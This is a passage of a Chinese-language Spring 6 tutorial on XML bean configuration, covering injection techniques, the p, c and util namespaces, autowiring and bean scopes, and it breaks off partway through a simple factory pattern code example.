attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>root<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>prop</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>prop</span> <span class="token attr-name">key</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>123456<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>prop</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>props</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span></code></pre><p>要点：<br>●使用<props>标签嵌套<prop>标签完成。</p><h5 id="4-3-10-注入null和空字符串"><a href="#4-3-10-注入null和空字符串" class="headerlink" title="4.3.10 注入null和空字符串"></a>4.3.10 注入null和空字符串</h5><p>注入空字符串使用：<value/> 或者 value=””<br>注入null使用：<null/> 或者 不为该属性赋值</p><pre class=" language-xml"><code class="language-xml">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>vipBean<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.powernode.spring6.beans.Vip<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token comment" spellcheck="true">&lt;!--空串的第一种方式--></span>        <span class="token comment" spellcheck="true">&lt;!--&lt;property name="email" value=""/>--></span>        <span class="token comment" spellcheck="true">&lt;!--空串的第二种方式--></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>vipBean<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.powernode.spring6.beans.Vip<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>null</span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span></code></pre><h5 id="4-3-11-注入的值中含有特殊符号"><a href="#4-3-11-注入的值中含有特殊符号" class="headerlink" title="4.3.11 注入的值中含有特殊符号"></a>4.3.11 注入的值中含有特殊符号</h5><p>XML中有5个特殊字符，分别是：&lt;、&gt;、’、”、&amp;<br>以上5个特殊符号在XML中会被特殊对待，会被当做XML语法的一部分进行解析，如果这些特殊符号直接出现在注入的字符串当中，会报错。</p><p>解决方案包括两种：</p><p>●第一种：特殊符号使用转义字符代替。</p><p>●第二种：将含有特殊符号的字符串放到：<![CDATA[]]> 当中。因为放在CDATA区中的数据不会被XML文件解析器解析。</p><p>5个特殊字符对应的转义字符分别是：</p><p><img src="assets/image-20230319205708742.png" alt="image-20230319205708742"></p><p>2&lt;3</p><pre class=" language-xml"><code class="language-xml">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>mathBean<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.powernode.spring6.beans.Math<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>result<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>2 &amp;lt; 3<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>mathBean<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.powernode.spring6.beans.Math<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>result<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token comment" spellcheck="true">&lt;!--采用CDATA方式只能使用value标签--></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span><span class="token cdata">&lt;![CDATA[2 &lt; 3]]></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span></code></pre><h5 id="4-4-p命名空间注入"><a href="#4-4-p命名空间注入" class="headerlink" title="4.4 p命名空间注入"></a>4.4 p命名空间注入</h5><p>目的：简化配置。<br>使用p命名空间注入的前提条件包括两个：<br>●第一：在XML头部信息中添加p命名空间的配置信息：xmlns:p=”<a href="http://www.springframework.org/schema/p&quot;" target="_blank" rel="noopener">http://www.springframework.org/schema/p&quot;</a><br>●第二：p命名空间注入是基于setter方法的，所以需要对应的属性提供setter方法。</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>p</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/p<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>customerBean<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.powernode.spring6.beans.Customer<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">p:</span>name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>zhangsan<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">p:</span>age</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>20<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">></span></span></code></pre><h5 id="4-5-c命名空间注入"><a href="#4-5-c命名空间注入" class="headerlink" title="4.5 c命名空间注入"></a>4.5 c命名空间注入</h5><p>c命名空间是简化构造方法注入的。<br>使用c命名空间的两个前提条件：<br>第一：需要在xml配置文件头部添加信息：xmlns:c=”<a href="http://www.springframework.org/schema/c&quot;" target="_blank" rel="noopener">http://www.springframework.org/schema/c&quot;</a><br>第二：需要提供构造方法。</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>c</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/c<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!--&lt;bean id="myTimeBean" class="com.powernode.spring6.beans.MyTime" c:year="1970" c:month="1" c:day="1"/>--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>myTimeBean<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.powernode.spring6.beans.MyTime<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">c:</span>_0</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>2008<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">c:</span>_1</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>8<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">c:</span>_2</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>8<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">></span></span></code></pre><p>注意：不管是p命名空间还是c命名空间，注入的时候都可以注入简单类型以及非简单类型。</p><h5 id="4-6-util命名空间"><a href="#4-6-util命名空间" class="headerlink" title="4.6 util命名空间"></a>4.6 util命名空间</h5><p>使用util命名空间可以让配置复用。<br>使用util命名空间的前提是：在spring配置文件头部添加配置信息。如下</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>util</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/util<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd                           http://www.springframework.org/schema/util http://www.springframework.org/schema/util/spring-util.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">util:</span>properties</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>prop<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>prop</span> <span class="token attr-name">key</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>driver<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>com.mysql.cj.jdbc.Driver<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>prop</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>prop</span> <span class="token attr-name">key</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>jdbc:mysql://localhost:3306/spring<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>prop</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>prop</span> <span class="token attr-name">key</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>root<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>prop</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>prop</span> <span class="token attr-name">key</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>123456<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>prop</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">util:</span>properties</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>dataSource1<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.powernode.spring6.beans.MyDataSource1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>properties<span class="token punctuation">"</span></span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>prop<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>dataSource2<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.powernode.spring6.beans.MyDataSource2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>properties<span class="token punctuation">"</span></span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>prop<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">></span></span></code></pre><h5 id="4-7-基于XML的自动装配"><a href="#4-7-基于XML的自动装配" class="headerlink" title="4.7 基于XML的自动装配"></a>4.7 基于XML的自动装配</h5><p>Spring还可以完成自动化的注入，自动化注入又被称为自动装配。它可以根据名字进行自动装配，也可以根据类型进行自动装配。</p><h5 id="4-7-1-根据名称自动装配"><a href="#4-7-1-根据名称自动装配" class="headerlink" title="4.7.1 根据名称自动装配"></a>4.7.1 根据名称自动装配</h5><pre class=" language-xml"><code class="language-xml">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>userService<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.powernode.spring6.service.UserService<span class="token punctuation">"</span></span> <span class="token attr-name">autowire</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>byName<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>aaa<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.powernode.spring6.dao.UserDao<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></code></pre><p>这个配置起到关键作用：<br>●UserService Bean中需要添加autowire=”byName”，表示通过名称进行装配。<br>●UserService类中有一个UserDao属性，而UserDao属性的名字是aaa，对应的set方法是setAaa()，正好和UserDao Bean的id是一样的。这就是根据名称自动装配。</p><h5 id="4-7-2-根据类型自动装配"><a href="#4-7-2-根据类型自动装配" class="headerlink" title="4.7.2 根据类型自动装配"></a>4.7.2 根据类型自动装配</h5><pre class=" language-xml"><code class="language-xml">    <span class="token comment" spellcheck="true">&lt;!--byType表示根据类型自动装配--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>accountService<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.powernode.spring6.service.AccountService<span class="token punctuation">"</span></span> <span class="token attr-name">autowire</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>byType<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.powernode.spring6.dao.AccountDao<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></code></pre><p>无论是byName还是byType，在装配的时候都是基于set方法的。所以set方法是必须要提供的。当<strong>byType</strong>进行自动装配的时候，配置文件中某种类型的Bean必须是<strong>唯一</strong>的，不能出现多个。</p><h4 id="4-8-Spring引入外部属性配置文件"><a href="#4-8-Spring引入外部属性配置文件" class="headerlink" title="4.8 Spring引入外部属性配置文件"></a>4.8 Spring引入外部属性配置文件</h4><p>在spring配置文件中引入context命名空间。</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>context</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/context<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd                           http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">context:</span>property-placeholder</span> <span class="token attr-name">location</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>jdbc.properties<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>dataSource<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.powernode.spring6.beans.MyDataSource<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>driver<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>${driver}<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>${url}<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>${username}<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>${password}<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">></span></span></code></pre><h3 id="五、Bean的作用域"><a href="#五、Bean的作用域" class="headerlink" title="五、Bean的作用域"></a>五、Bean的作用域</h3><h4 id="5-1-singleton（默认）"><a href="#5-1-singleton（默认）" class="headerlink" title="5.1 singleton（默认）"></a>5.1 singleton（默认）</h4><p>Spring的IoC容器中，默认情况下，Bean对象是单例的。默认情况下，Bean对象的创建是在初始化Spring上下文的时候就完成的。(解析spring配置文件时就完成)</p><h4 id="5-2-prototype"><a href="#5-2-prototype" class="headerlink" title="5.2 prototype"></a>5.2 prototype</h4><p>如果想让Spring的Bean对象以多例的形式存在，可以在bean标签中指定scope属性的值为：prototype，这样Spring会在每一次执行getBean()方法的时候创建Bean对象，调用几次则创建几次。</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sb<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.powernode.spring6.beans.SpringBean<span class="token punctuation">"</span></span> <span class="token attr-name">scope</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>prototype<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">></span></span></code></pre><p>prototype模式下，spring容器启动的时候，并不创建对象。在<strong>每次getBean(“sb”, SpringBean.class);的时候才会每次再创建对象</strong></p><h4 id="5-3-其它scope"><a href="#5-3-其它scope" class="headerlink" title="5.3 其它scope"></a>5.3 其它scope</h4><p>scope属性的值不止两个，它一共包括8个选项：<br>●singleton：默认的，单例。<br>●prototype：原型。每调用一次getBean()方法则获取一个新的Bean对象。或每次注入的时候都是新对象。<br>●request：一个请求对应一个Bean。仅限于在WEB应用中使用。<br>●session：一个会话对应一个Bean。仅限于在WEB应用中使用。<br>●global session：portlet应用中专用的。如果在Servlet的WEB应用中使用global session的话，和session一个效果。（portlet和servlet都是规范。servlet运行在servlet容器中，例如Tomcat。portlet运行在portlet容器中。）<br>●application：一个应用对应一个Bean。仅限于在WEB应用中使用。<br>●websocket：一个websocket生命周期对应一个Bean。仅限于在WEB应用中使用。<br>●自定义scope：很少使用。</p><h3 id="六、GoF之工厂模式"><a href="#六、GoF之工厂模式" class="headerlink" title="六、GoF之工厂模式"></a>六、GoF之工厂模式</h3><h4 id="6-1-工厂模式的三种形态"><a href="#6-1-工厂模式的三种形态" class="headerlink" title="6.1 工厂模式的三种形态"></a>6.1 工厂模式的三种形态</h4><p>●第一种：简单工厂模式（Simple Factory）：不属于23种设计模式之一。简单工厂模式又叫做：静态 工厂方法模式。简单工厂模式是工厂方法模式的一种特殊实现。</p><p>●第二种：工厂方法模式（Factory Method）：是23种设计模式之一。</p><p>●第三种：抽象工厂模式（Abstract Factory）：是23种设计模式之一。</p><h4 id="6-2-简单工厂模式"><a href="#6-2-简单工厂模式" class="headerlink" title="6.2 简单工厂模式"></a>6.2 简单工厂模式</h4><p>简单工厂模式的角色包括三个：<br>●抽象产品 角色<br>●具体产品 角色<br>●工厂类 角色</p><pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">static</span> Weapon <span class="token function">get</span><span class="token punctuation">(</span>String weaponType<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>weaponType <span class="token operator">==</span> null <span class="token operator">||</span> weaponType<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> null<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        Weapon weapon <span class="token operator">=</span> null<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"TANK"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>weaponType<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            weapon <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Tank</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"FIGHTER"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>weaponType<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            weapon <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Fighter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"DAGGER"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>weaponType<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            weapon <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Dagger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">"不支持该武器！"</span><span class="token punctuation">)</span><span class="token 